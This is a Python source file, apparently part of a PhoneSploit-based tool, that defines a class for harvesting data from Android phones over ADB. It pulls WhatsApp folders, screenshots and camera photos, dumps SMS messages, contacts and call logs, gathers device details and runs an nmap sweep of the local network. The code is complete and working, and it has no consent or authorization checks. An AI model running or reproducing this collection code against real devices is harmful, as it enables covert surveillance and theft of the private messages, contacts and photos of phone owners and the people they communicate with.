"""
Enhanced Data Collection System
Collects data from devices using PhoneSploit methods
"""

import asyncio
import json
import logging
import os
import subprocess
import time
from typing import Dict, List, Optional
from datetime import datetime

class EnhancedDataCollection:
    """Enhanced data collection system for PhoneSploit features"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.adb_path = "adb"
        self.current_device = None
        self.collection_history = []
        
    async def copy_whatsapp_data(self, save_path: str = None) -> Dict:
        """Copy all WhatsApp data from device"""
        try:
            if not self.current_device:
                return {
                    "success": False,
                    "error": "No device connected"
                }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            folder_name = f"whatsapp_data_{timestamp}"
            
            if save_path:
                folder_name = os.path.join(save_path, folder_name)
            
            # Create directory
            os.makedirs(folder_name, exist_ok=True)
            
            # WhatsApp data paths
            whatsapp_paths = [
                "/sdcard/WhatsApp",
                "/sdcard/Android/media/com.whatsapp",
                "/data/data/com.whatsapp"
            ]
            
            copied_files = []
            
            for path in whatsapp_paths:
                try:
                    # Check if path exists
                    check_result = await self._execute_adb_command(f"shell ls {path}")
                    if "No such file" not in check_result:
                        # Pull WhatsApp data
                        pull_result = await self._execute_adb_command(f"pull {path} {folder_name}")
                        copied_files.append(path)
                except Exception as e:
                    self.logger.warning(f"Failed to copy {path}: {str(e)}")
            
            if copied_files:
                return {
                    "success": True,
                    "folder_path": os.path.abspath(folder_name),
                    "copied_paths": copied_files,
                    "message": "WhatsApp data copied successfully"
                }
            else:
                return {
                    "success": False,
                    "error": "No WhatsApp data found"
                }
                
        except Exception as e:
            self.logger.error(f"Error copying WhatsApp data: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def copy_device_screenshots(self, save_path: str = None) -> Dict:
        """Copy all screenshots from device"""
        try:
            if not self.current_device:
                return {
                    "success": False,
                    "error": "No device connected"
                }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            folder_name = f"screenshots_{timestamp}"
            
            if save_path:
                folder_name = os.path.join(save_path, folder_name)
            
            # Create directory
            os.makedirs(folder_name, exist_ok=True)
            
            # Screenshot paths
            screenshot_paths = [
                "/sdcard/Pictures/Screenshots",
                "/sdcard/DCIM/Screenshots",
                "/sdcard/Screenshots"
            ]
            
            copied_files = []
            
            for path in screenshot_paths:
                try:
                    # Check if path exists
                    check_result = await self._execute_adb_command(f"shell ls {path}")
                    if "No such file" not in check_result:
                        # Pull screenshots
                        pull_result = await self._execute_adb_command(f"pull {path} {folder_name}")
                        copied_files.append(path)
                except Exception as e:
                    self.logger.warning(f"Failed to copy {path}: {str(e)}")
            
            if copied_files:
                return {
                    "success": True,
                    "folder_path": os.path.abspath(folder_name),
                    "copied_paths": copied_files,
                    "message": "Screenshots copied successfully"
                }
            else:
                return {
                    "success": False,
                    "error": "No screenshots found"
                }
                
        except Exception as e:
            self.logger.error(f"Error copying screenshots: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def copy_camera_photos(self, save_path: str = None) -> Dict:
        """Copy all camera photos from device"""
        try:
            if not self.current_device:
                return {
                    "success": False,
                    "error": "No device connected"
                }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            folder_name = f"camera_photos_{timestamp}"
            
            if save_path:
                folder_name = os.path.join(save_path, folder_name)
            
            # Create directory
            os.makedirs(folder_name, exist_ok=True)
            
            # Camera photo paths
            camera_paths = [
                "/sdcard/DCIM/Camera",
                "/sdcard/Pictures/Camera",
                "/sdcard/Camera"
            ]
            
            copied_files = []
            
            for path in camera_paths:
                try:
                    # Check if path exists
                    check_result = await self._execute_adb_command(f"shell ls {path}")
                    if "No such file" not in check_result:
                        # Pull camera photos
                        pull_result = await self._execute_adb_command(f"pull {path} {folder_name}")
                        copied_files.append(path)
                except Exception as e:
                    self.logger.warning(f"Failed to copy {path}: {str(e)}")
            
            if copied_files:
                return {
                    "success": True,
                    "folder_path": os.path.abspath(folder_name),
                    "copied_paths": copied_files,
                    "message": "Camera photos copied successfully"
                }
            else:
                return {
                    "success": False,
                    "error": "No camera photos found"
                }
                
        except Exception as e:
            self.logger.error(f"Error copying camera photos: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def dump_sms_messages(self, save_path: str = None) -> Dict:
        """Dump all SMS messages from device"""
        try:
            if not self.current_device:
                return {
                    "success": False,
                    "error": "No device connected"
                }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"sms_dump_{timestamp}.txt"
            
            if save_path:
                filename = os.path.join(save_path, filename)
            
            # Get SMS messages using content provider
            sms_command = "shell content query --uri content://sms"
            result = await self._execute_adb_command(sms_command)
            
            if result and "No result" not in result:
                # Save SMS data
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(result)
                
                return {
                    "success": True,
                    "filename": filename,
                    "path": os.path.abspath(filename),
                    "message": "SMS messages dumped successfully"
                }
            else:
                return {
                    "success": False,
                    "error": "No SMS messages found or access denied"
                }
                
        except Exception as e:
            self.logger.error(f"Error dumping SMS: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def dump_device_contacts(self, save_path: str = None) -> Dict:
        """Dump all contacts from device"""
        try:
            if not self.current_device:
                return {
                    "success": False,
                    "error": "No device connected"
                }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"contacts_dump_{timestamp}.txt"
            
            if save_path:
                filename = os.path.join(save_path, filename)
            
            # Get contacts using content provider
            contacts_command = "shell content query --uri content://com.android.contacts/contacts"
            result = await self._execute_adb_command(contacts_command)
            
            if result and "No result" not in result:
                # Save contacts data
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(result)
                
                return {
                    "success": True,
                    "filename": filename,
                    "path": os.path.abspath(filename),
                    "message": "Contacts dumped successfully"
                }
            else:
                return {
                    "success": False,
                    "error": "No contacts found or access denied"
                }
                
        except Exception as e:
            self.logger.error(f"Error dumping contacts: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def dump_call_logs(self, save_path: str = None) -> Dict:
        """Dump all call logs from device"""
        try:
            if not self.current_device:
                return {
                    "success": False,
                    "error": "No device connected"
                }
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"call_logs_dump_{timestamp}.txt"
            
            if save_path:
                filename = os.path.join(save_path, filename)
            
            # Get call logs using content provider
            call_logs_command = "shell content query --uri content://call_log/calls"
            result = await self._execute_adb_command(call_logs_command)
            
            if result and "No result" not in result:
                # Save call logs data
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(result)
                
                return {
                    "success": True,
                    "filename": filename,
                    "path": os.path.abspath(filename),
                    "message": "Call logs dumped successfully"
                }
            else:
                return {
                    "success": False,
                    "error": "No call logs found or access denied"
                }
                
        except Exception as e:
            self.logger.error(f"Error dumping call logs: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def get_device_information(self) -> Dict:
        """Get detailed device information"""
        try:
            if not self.current_device:
                return {
                    "success": False,
                    "error": "No device connected"
                }
            
            device_info = {}
            
            # Get device properties
            properties = [
                "ro.product.model",
                "ro.product.brand",
                "ro.product.name",
                "ro.build.version.release",
                "ro.build.version.sdk",
                "ro.serialno",
                "ro.product.cpu.abi",
                "ro.product.locale",
                "ro.product.manufacturer"
            ]
            
            for prop in properties:
                try:
                    result = await self._execute_adb_command(f"shell getprop {prop}")
                    device_info[prop] = result.strip()
                except Exception as e:
                    device_info[prop] = "Unknown"
            
            # Get storage information
            try:
                storage_result = await self._execute_adb_command("shell df /sdcard")
                device_info["storage"] = storage_result
            except Exception as e:
                device_info["storage"] = "Unknown"
            
            # Get memory information
            try:
                memory_result = await self._execute_adb_command("shell cat /proc/meminfo")
                device_info["memory"] = memory_result
            except Exception as e:
                device_info["memory"] = "Unknown"
            
            # Get CPU information
            try:
                cpu_result = await self._execute_adb_command("shell cat /proc/cpuinfo")
                device_info["cpu"] = cpu_result
            except Exception as e:
                device_info["cpu"] = "Unknown"
            
            return {
                "success": True,
                "device_info": device_info,
                "message": "Device information retrieved successfully"
            }
            
        except Exception as e:
            self.logger.error(f"Error getting device information: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def get_battery_information(self) -> Dict:
        """Get battery information"""
        try:
            if not self.current_device:
                return {
                    "success": False,
                    "error": "No device connected"
                }
            
            # Get battery information
            battery_command = "shell dumpsys battery"
            result = await self._execute_adb_command(battery_command)
            
            if result:
                # Parse battery information
                battery_info = {}
                lines = result.strip().split('\n')
                
                for line in lines:
                    if ':' in line:
                        key, value = line.split(':', 1)
                        battery_info[key.strip()] = value.strip()
                
                return {
                    "success": True,
                    "battery_info": battery_info,
                    "raw_data": result,
                    "message": "Battery information retrieved successfully"
                }
            else:
                return {
                    "success": False,
                    "error": "Failed to get battery information"
                }
                
        except Exception as e:
            self.logger.error(f"Error getting battery information: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def scan_network_devices(self, network_range: str = "192.168.1.0/24") -> Dict:
        """Scan network for devices"""
        try:
            # Use nmap for network scanning
            scan_command = f"nmap -sn {network_range}"
            
            result = subprocess.run(
                scan_command.split(),
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                # Parse scan results
                devices = []
                lines = result.stdout.strip().split('\n')
                
                for line in lines:
                    if "Nmap scan report" in line:
                        # Extract IP address
                        ip_match = line.split()[-1]
                        if ip_match and ip_match != "for":
                            devices.append({
                                "ip_address": ip_match,
                                "status": "up"
                            })
                
                return {
                    "success": True,
                    "devices": devices,
                    "count": len(devices),
                    "network_range": network_range,
                    "message": "Network scan completed successfully"
                }
            else:
                return {
                    "success": False,
                    "error": "Network scan failed",
                    "message": result.stderr
                }
                
        except Exception as e:
            self.logger.error(f"Error scanning network: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _execute_adb_command(self, command: str) -> str:
        """Execute ADB command"""
        try:
            full_command = f"{self.adb_path} {command}"
            self.logger.debug(f"Executing: {full_command}")
            
            result = subprocess.run(
                full_command.split(),
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Log collection in history
            self.collection_history.append({
                "command": full_command,
                "timestamp": datetime.now().isoformat(),
                "return_code": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr
            })
            
            if result.returncode == 0:
                return result.stdout
            else:
                self.logger.error(f"ADB command failed: {result.stderr}")
                return result.stderr
                
        except subprocess.TimeoutExpired:
            self.logger.error(f"ADB command timed out: {command}")
            return "Command timed out"
        except Exception as e:
            self.logger.error(f"Error executing ADB command: {str(e)}")
            return str(e)
    
    def get_collection_history(self) -> List[Dict]:
        """Get data collection history"""
        return self.collection_history
    
    def clear_collection_history(self):
        """Clear collection history"""
        self.collection_history.clear()
        self.logger.info("Collection history cleared")
    
    def get_collection_statistics(self) -> Dict:
        """Get data collection statistics"""
        total_operations = len(self.collection_history)
        successful_operations = len([op for op in self.collection_history if op["return_code"] == 0])
        failed_operations = total_operations - successful_operations
        
        return {
            "total_operations": total_operations,
            "successful_operations": successful_operations,
            "failed_operations": failed_operations,
            "success_rate": (successful_operations / total_operations * 100) if total_operations > 0 else 0
        }